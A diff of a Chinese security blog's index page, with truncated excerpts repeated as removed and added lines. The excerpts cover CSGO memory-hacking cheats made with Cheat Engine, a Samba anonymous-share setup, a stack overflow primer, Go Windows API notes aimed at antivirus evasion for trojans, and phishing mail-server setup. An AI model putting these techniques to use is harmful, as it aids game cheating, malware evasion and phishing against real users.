 看到这个变成红绿闪烁的时候搜索变动的值，然后离开下包点
 
 等这个变成绿色的时候再次搜索变动的，以此往复
+ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/144.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(四)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)">CSGO破解学习(四)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-17T15:58:53.000Z" title="发表于 2022-04-17 23:58:53">2022-04-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
-可以 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/144.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(四)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)">CSGO破解学习(四)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-17T15:58:53.000Z" title="发表于 2022-04-17 23:58:53">2022-04-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
-
-手枪连发查找方式和之前的无后座力一样的操作，通过浏览内存地址区域（当前角色的主武器子弹地址），然后我们可以看到，开枪后按住左键只有一个地址在疯狂跳动，松开武器后直接变为了0
+手枪连发
+查找方式和之前的无后座力一样的操作，通过浏览内存地址区域（当前角色的主武器子弹地址），然后我们可以看到，开枪后按住左键只有一个地址在疯狂跳动，松开武器后直接变为了0
 
 我们把这个地址添加到列表中，然后锁定他
 
 可以看到手枪变成了冲锋枪，然后通过基地址一查，和冲锋枪的无后座力是同一个值，我们锁定无后座力的值查看
 
-辨别敌我首先添加3个机器人，然后按~键弹出控制面板，输入bot_stop 1
+辨别敌我
+首先添加3个机器人，然后按~键弹出控制面板，输入bot_stop 1
 
 接着把准心对着敌人进行进行搜索未知初始值
 
@@ -627,10 +681,11 @@ CSGO版本更改为v3248（对之前版本的基地址进行了修改）
 
 最终只剩下这些值以后，当我们把鼠标当道敌人身上可以看到绿色和黑色的地址中有一个值06689B2C和01A01F14都是为2，而06689B30和01A01F18显示不同的数值，接下来我们切换到自己的阵营看看
 
-06689B2C和01A01F14的值变成了1，而06689 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/143.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(三)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)">CSGO破解学习(三)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-15T15:58:53.000Z" title="发表于 2022-04-15 23:58:53">2022-04-15</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+06689B2C和01A01F14的值变成了1，而066 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/143.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(三)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)">CSGO破解学习(三)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-15T15:58:53.000Z" title="发表于 2022-04-15 23:58:53">2022-04-15</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-被攻击不减速有两种方式来搜索这个地址
+被攻击不减速
+有两种方式来搜索这个地址
 
 编辑-&gt;热键，然后在变动的数值和未变动的数值中设置快捷键，然后通过在扫描类型中选择：未知的初始化值，然后在被攻击的时候按变动的数值快捷键，未被攻击的时候按未变动的数值快捷键，来找出值（速度巨慢）
 根据C++结构体的方式来查找
@@ -641,9 +696,10 @@ CSGO版本更改为v3248（对之前版本的基地址进行了修改）
 
 最后就在攻击和被攻击的时候分别查看上面一块区域和下面一块区域的内存地址，找到想符合的值，就是这个人物结构体上下找相关的值
 
-图中纵坐标0066C5670横坐标38位置的值可以看到我们被攻击了就变成了小于1的值，如果不被攻击就为1，我们就断定他就是被攻击的小数值，然后我们右键这个值然后把他 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/142.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="SMB匿名访问共享"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享">SMB匿名访问共享</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-14T15:58:53.000Z" title="发表于 2022-04-14 23:58:53">2022-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/SMB/">SMB</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+图中纵坐标0066C5670横坐标38位置的值可以看到我们被攻击了就变成了小于1的值，如果不被攻击就为1，我们就断定他就是被攻击的小数值，然后我们右键这个值然后把 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/142.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="SMB匿名访问共享"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享">SMB匿名访问共享</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-14T15:58:53.000Z" title="发表于 2022-04-14 23:58:53">2022-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/SMB/">SMB</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
-kali修改文件/etc/samba/smb.conf，内容如下：
+kali
+修改文件/etc/samba/smb.conf，内容如下：
 [global]    map to guest = bad user    server role = standalone server    usershare allow guests = yes    idmap config * : backend = tdb    smb ports = 445[smb]    comment = Samba    path = /tmp/    guest ok = yes    read only = no    browsable = yes
 然后启动服务
 service smbd start service nmbd start 
@@ -652,10 +708,12 @@ mount -t cifs //192.168.50.28/ascotbe /tmp
 然后访问的Windows需要开启这个设置
 
 
-windows启用Guest ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/141.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)">CSGO破解学习(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-04T15:58:53.000Z" title="发表于 2022-04-04 23:58:53">2022-04-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.610Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+windows
+启用Gue ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/141.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)">CSGO破解学习(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-04T15:58:53.000Z" title="发表于 2022-04-04 23:58:53">2022-04-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.610Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-搜索血量在搜索血量的时候我按着之前子弹的办法来搜索，结果找不到具体的值，后面发现血量有可能是单浮点，而并不是我们看到的那个整数
+搜索血量
+在搜索血量的时候我按着之前子弹的办法来搜索，结果找不到具体的值，后面发现血量有可能是单浮点，而并不是我们看到的那个整数
 
 然后我们购买炸弹o+4进行购买，然后炸自己（别炸死了），就按这种方式一直搜索，然后找到黑色的地址通过验证子弹的方式来验证，最终找到如下临时地址
 
@@ -674,21 +732,25 @@ windows启用Guest ...</div></div></div><div class="recent-post-item"><div class
 
 看看我们发现了什么？和我们子弹的基址是一样的，那么我们就可以断定，这个值是我们当前角色的基址，而另一个是所有玩家的基址，最终我们得到了如下结果
 
-然后我们添加机器人验证，可以看到所有人血量的地址 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/140.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(一)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)">CSGO破解学习(一)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-20T15:58:53.000Z" title="发表于 2022-03-20 23:58:53">2022-03-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-15T02:27:03.821Z" title="更新于 2023-06-15 10:27:03">2023-06-15</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+然后我们添加机器人验证，可以看到所有人血量的地 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/140.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(一)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)">CSGO破解学习(一)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-20T15:58:53.000Z" title="发表于 2022-03-20 23:58:53">2022-03-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-15T02:27:03.821Z" title="更新于 2023-06-15 10:27:03">2023-06-15</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 准备工作
-CSGO1.6版本 
 
-分卷1 
+
+CSGO1.6版本
+
+分卷1
 分卷2
 分卷3
+
 
 
 Cheat Engine下载地址
 
 
-搜索子弹在正式开始前还是需要一些基本的使用知识，首先我们通过内存搜索子弹，然后基于二分法进行筛选数据
+搜索子弹
+在正式开始前还是需要一些基本的使用知识，首先我们通过内存搜索子弹，然后基于二分法进行筛选数据
 
 上面是我们搜索出来的数据，暂时把它定义为当前地图当前身份当前人物手持的这一把AK枪的子弹内存
 
@@ -704,7 +766,7 @@ Cheat Engine下载地址
 
 可以看到第一个地址的值变为了00000000，那我们可以知道这个地址是当前主武器的名称，而里面的06F03960是这个武器的名称。我们尝试丢弃主武器后重新换一把枪
 
-接下来把 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/139.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x00）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）">Linux栈溢出总结（0x00）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-22T10:45:42.000Z" title="发表于 2022-02-22 18:45:42">2022-02-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+接下 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/139.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x00）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）">Linux栈溢出总结（0x00）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-22T10:45:42.000Z" title="发表于 2022-02-22 18:45:42">2022-02-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -712,43 +774,53 @@ Cheat Engine下载地址
 距离第一篇栈溢出学习文章已经过去了1年半了，今天看到一篇文章终于解决了之前的一些疑惑，也理清了很多东西，记录一下，原文地址
 https://mp.weixin.qq.com/s/cmLp5aHfqy1-wYiNiqdq-Q
 
-什么是栈简单来说，栈 是一种 LIFO（Last In Frist Out，后进先出） 形式的数据结构。栈一般是从高地址向低地址增长，并且栈支持 push（入栈） 和 pop（出栈） 两个操作。如下图所示：
+什么是栈
+简单来说，栈 是一种 LIFO（Last In Frist Out，后进先出） 形式的数据结构。栈一般是从高地址向低地址增长，并且栈支持 push（入栈） 和 pop（出栈） 两个操作。如下图所示：
 
 push 操作先将 栈顶（sp指针） 向下移动一个位置，然后将数据写入到新的栈顶；而 pop 操作会从 栈顶 读取数据，并且将 栈顶（sp指针） 向上移动一个位置。
 例如，将 0x100 压入栈，过程如下图所示：
 
 我们再来看看 出栈 操作，如下图所示：
 
-栈帧栈帧，也就是 Sack Frame，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/132.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Go使用WindowsApi笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记">Go使用WindowsApi笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-04T12:02:59.000Z" title="发表于 2021-09-04 20:02:59">2021-09-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Golang/">Golang</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+栈帧
+栈帧，也就是 Sack Frame，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/132.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Go使用WindowsApi笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记">Go使用WindowsApi笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-04T12:02:59.000Z" title="发表于 2021-09-04 20:02:59">2021-09-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Golang/">Golang</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 在学Go相关的免杀，来提高木马的存活性，看到一些有意思的东西记下来
 
-加载DLL要在Go中加载DLL，可以使用syscall.NewLazyDLL或syscall.LoadLibrary 以及syscall.MustLoadDLL。
+加载DLL
+要在Go中加载DLL，可以使用syscall.NewLazyDLL或syscall.LoadLibrary 以及syscall.MustLoadDLL。
 
 NewLazyDLL返回一个*LazyDLL，懒加载，只在第一次调用其函数时才加载库;
 LoadLibrary是立即加载DLL库。
 
 创建函数
+
 syscall.NewLazyDLL
 
-package mainimport (	&quot;syscall&quot;	&quot;unsafe&quot;)func main() &#123;	user32 := syscall.NewLazyDLL(&quot;user32.dll&quot;)	MessageBoxW := user32.NewProc(&quot;MessageBoxW&quot;)	MessageBoxW.Call(u ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/131.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="关于邮件钓鱼的哪些事(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)">关于邮件钓鱼的哪些事(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-17T13:45:42.000Z" title="发表于 2021-08-17 21:45:42">2021-08-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+package mainimport (	&quot;syscall&quot;	&quot;unsafe&quot;)func main() &#123;	user32 := syscall.NewLazyDLL(&quot;user32.dll&quot;)	MessageBoxW := user32.NewProc(&quot;MessageBoxW&quot;)	MessageBoxW.Call ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/131.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="关于邮件钓鱼的哪些事(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)">关于邮件钓鱼的哪些事(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-17T13:45:42.000Z" title="发表于 2021-08-17 21:45:42">2021-08-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 首先需要编写一个钓鱼一键化平台，然后进入我们的正题
 
-搭建邮件服务器首先卸载Postfix如果没有Postfix就跳过
+搭建邮件服务器
+首先卸载Postfix
+如果没有Postfix就跳过
